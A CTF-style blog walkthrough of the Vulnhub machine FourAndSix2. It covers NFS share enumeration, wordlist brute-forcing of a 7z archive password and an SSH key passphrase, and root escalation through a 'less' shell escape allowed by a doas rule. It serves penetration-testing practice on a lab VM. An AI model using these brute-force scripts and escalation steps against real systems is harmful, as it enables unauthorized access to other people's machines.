---
layout:     post
title:      "Vulnhub.com - FourAndSix2"
date:       2018-12-10 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Task is to become root and read /root/flag.txt.

* Author: [Fred](https://www.vulnhub.com/author/fred,583/)
* Download: [https://www.vulnhub.com/entry/fourandsix-201,266/](https://www.vulnhub.com/entry/fourandsix-201,266/)

We can start by running `nmap` on our target IP.

{% highlight text %}
root@kali:~# nmap -sC -sV -sS -A 10.0.0.7
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-07 05:41 EST
Nmap scan report for 10.0.0.7
Host is up (0.00085s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)
|   256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)
|_  256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)
111/tcp  open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3         2049/tcp  nfs
|   100003  2,3         2049/udp  nfs
|   100005  1,3          658/udp  mountd
|_  100005  1,3          942/tcp  mountd
2049/tcp open  nfs     2-3 (RPC #100003)
MAC Address: 08:00:27:41:81:5A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: OpenBSD 6.X
OS CPE: cpe:/o:openbsd:openbsd:6
OS details: OpenBSD 6.0 - 6.1
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.85 ms 10.0.0.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.75 seconds
{% endhighlight %}

There is `nfs` up and running. We can use `showmount` to view if there are any mountable shares. 

{% highlight text %}
root@kali:~# showmount -e 10.0.0.7
Export list for 10.0.0.7:
/home/user/storage (everyone)
{% endhighlight %}

Great, we have open share, which we can mount. 

{% highlight text %}
root@kali:~# mkdir /tmp/storage
root@kali:~# mount -t nfs 10.0.0.7:/home/user/storage /tmp/storage
root@kali:~# cd /tmp/storage/
root@kali:/tmp/storage# ls -la
total 68
drwxr-xr-x  2 1000 1000   512 Oct 29 08:28 .
drwxrwxrwt 16 root root  4096 Dec  7 06:07 ..
-rw-r--r--  1 1000 1000 62111 Oct 29 08:28 backup.7z
{% endhighlight %}

And now we have a file called `backup.7z` to analyze. 

{% highlight text %}
root@kali:/tmp/storage# 7z e backup.7z 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-2410M CPU @ 2.30GHz (206A7),ASM,AES-NI)

Scanning the drive for archives:
1 file, 62111 bytes (61 KiB)

Extracting archive: backup.7z
--
Path = backup.7z
Type = 7z
Physical Size = 62111
Headers Size = 303
Method = LZMA2:16 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
ERROR: Data Error in encrypted file. Wrong password? : hello1.jpeg
ERROR: Data Error in encrypted file. Wrong password? : hello2.png
ERROR: Data Error in encrypted file. Wrong password? : hello3.jpeg
ERROR: Data Error in encrypted file. Wrong password? : hello4.png
ERROR: Data Error in encrypted file. Wrong password? : hello5.jpeg
ERROR: Data Error in encrypted file. Wrong password? : hello6.png
ERROR: Data Error in encrypted file. Wrong password? : hello7.jpeg
ERROR: Data Error in encrypted file. Wrong password? : hello8.jpeg
ERROR: Data Error in encrypted file. Wrong password? : id_rsa
ERROR: Data Error in encrypted file. Wrong password? : id_rsa.pub
                 
Sub items Errors: 10

Archives with Errors: 1

Sub items Errors: 10
{% endhighlight %}

It's password protected, but while opening we can see some interesting files like `id_rsa`. As they may help us to get into the `ssh`, I decided to brute force the password with this little Python script. 

{% highlight python %}
#!/usr/bin/env python2
import os,sys
     
f = open(sys.argv[1],'r')
lines = f.read().splitlines()
     
for line in lines:
    x = os.system('7z e {0} -p{1}'.format(sys.argv[2],line))
    if x == 0:
    	print '[~] Password is : {0}\n\n'.format(line)
    	exit(1)
     
print '[!] Password not found in the provided list!\n\n'
{% endhighlight %}

Now let's run it and wait for the results. 

{% highlight text %}
root@kali:/tmp/storage# python brute.py /usr/share/wordlists/rockyou.txt backup.7z

Scanning the drive for archives:
1 file, 62111 bytes (61 KiB)

Extracting archive: backup.7z
--
Path = backup.7z
Type = 7z
Physical Size = 62111
Headers Size = 303
Method = LZMA2:16 7zAES
Solid = +
Blocks = 1

Everything is Ok

Files: 10
Size:       64066
Compressed: 62111
[~] Password is : chocolate
{% endhighlight %}

Now that we have everything decompressed, let's view the files. Firstly, in `id_rsa.pbu` we have name of the user. It will be essential for logging into the `ssh`.

{% highlight text %}
root@kali:/tmp/storage# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDClNemaX//nOugJPAWyQ1aDMgfAS8zrJh++hNeMGCo+TIm9UxVUNwc6vhZ8apKZHOX0Ht+MlHLYdkbwSinmCRmOkm2JbMYA5GNBG3fTNWOAbhd7dl2GPG7NUD+zhaDFyRk5gTqmuFumECDAgCxzeE8r9jBwfX73cETemexWKnGqLey0T56VypNrjvueFPmmrWCJyPcXtoLNQDbbdaWwJPhF0gKGrrWTEZo0NnU1lMAnKkiooDxLFhxOIOxRIXWtDtc61cpnnJHtKeO+9wL2q7JeUQB00KLs9/iRwV6b+kslvHaaQ4TR8IaufuJqmICuE4+v7HdsQHslmIbPKX6HANn user@fourandsix2
{% endhighlight %}

Unfortunately, we also need a passphrase for the key.

{% highlight text %}
root@kali:/tmp/storage# ssh user@10.0.0.7 -i id_rsa
The authenticity of host '10.0.0.7 (10.0.0.7)' can't be established.
ECDSA key fingerprint is SHA256:6ERaSFrckV66j7RBrFiTjwlQs8WMfIiGZSLNj4otVb4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.0.0.7' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
{% endhighlight %}

After trying to find clues in decompressed images, I decided to run another brute force attack.

{% highlight text %}
root@kali:/tmp/storage# ssh2john id_rsa > hash
! id_rsa : input keyfile validation failed
{% endhighlight %}

As `ssh2john` could not get the hashes from the key, I decided to run this simple one liner brute forcer with bash.

{% highlight text %}
root@kali:/tmp/storage# cat /usr/share/wordlists/rockyou.txt | while read pass; do if ssh-keygen -c -C “user@forandsix” -P $pass -f id_rsa &>/dev/null; then echo $pass; break; fi; done
12345678
{% endhighlight %}

And this time, we have a password `12345678`. Finally, we can log into the system. 

{% highlight text %}
root@kali:/tmp/storage# ssh user@10.0.0.7 -i id_rsa
Enter passphrase for key 'id_rsa': 
Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

fourandsix2$ ls -la
total 40
drwxr-xr-x  4 user  user   512 Oct 29 13:27 .
drwxr-xr-x  3 root  wheel  512 Oct 29 13:03 ..
-rw-r--r--  1 user  user    87 Oct 11 21:18 .Xdefaults
-rw-r--r--  1 user  user   771 Oct 11 21:18 .cshrc
-rw-r--r--  1 user  user   101 Oct 11 21:18 .cvsrc
-rw-r--r--  1 user  user   359 Oct 11 21:18 .login
-rw-r--r--  1 user  user   175 Oct 11 21:18 .mailrc
-rw-r--r--  1 user  user   215 Oct 11 21:18 .profile
drwx------  2 user  user   512 Oct 29 14:02 .ssh
drwxr-xr-x  2 user  user   512 Dec  8 12:24 storage
{% endhighlight %}

Doing simple enumaration for any misconfigured services, I've found `doas` tool.

{% highlight text %}
fourandsix2$ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
/usr/bin/at
/usr/bin/atq
/usr/bin/atrm
/usr/bin/batch
/usr/bin/chfn
/usr/bin/chpass
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/doas
/usr/bin/lock
/usr/bin/lpq
/usr/bin/lpr
/usr/bin/lprm
/usr/bin/passwd
/usr/bin/skeyaudit
/usr/bin/skeyinfo
/usr/bin/skeyinit
/usr/bin/ssh-agent
/usr/bin/su
/usr/bin/wall
/usr/bin/write
/usr/libexec/lockspool
/usr/libexec/ssh-keysign
/usr/sbin/authpf
/usr/sbin/authpf-noip
/usr/sbin/lpc
/usr/sbin/lpd
/usr/sbin/pppd
/usr/sbin/smtpctl
/usr/sbin/traceroute
/usr/sbin/traceroute6
/sbin/ping
/sbin/ping6
/sbin/shutdown
/var/audit
{% endhighlight %}

After viewing it's configuration files, we can see that it's possible to run `/usr/bin/less args /var/log/authlog` as root with `doas`. 

{% highlight text %}
fourandsix2$ cat /etc/doas.conf
permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
permit nopass keepenv root as root

fourandsix2$ doas /usr/bin/less /var/log/authlog
{% endhighlight %}

From that, further exploitation is trivial as we have to enter `!sh` in order to run commands just like in `vim`. 

{% highlight text %}
fourandsix2# cd /root
fourandsix2# ls -la
total 40
drwx------   3 root  wheel  512 Oct 29 13:26 .
drwxr-xr-x  13 root  wheel  512 Dec  8 12:32 ..
-rw-r--r--   1 root  wheel   87 Oct 11 21:18 .Xdefaults
-rw-r--r--   1 root  wheel  578 Oct 11 21:18 .cshrc
-rw-r--r--   1 root  wheel   94 Oct 11 21:18 .cvsrc
-rw-r--r--   1 root  wheel    5 Oct 29 13:03 .forward
-rw-r--r--   1 root  wheel  328 Oct 11 21:18 .login
-rw-r--r--   1 root  wheel  468 Oct 11 21:18 .profile
drwx------   2 root  wheel  512 Oct 29 14:02 .ssh
-rw-r--r--   1 root  wheel  426 Oct 29 13:25 flag.txt
fourandsix2# cat flag.txt                                                      
Nice you hacked all the passwords!

Not all tools worked well. But with some command magic...:
cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p"$line" -oout; if grep -iRl SSH; then echo $line; break;fi;done

cat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P "$line" -N password -f id_rsa; then echo $line; break;fi;done


Here is the flag:
acd043bc3103ed3dd02eee99d5b0ff42
{% endhighlight %}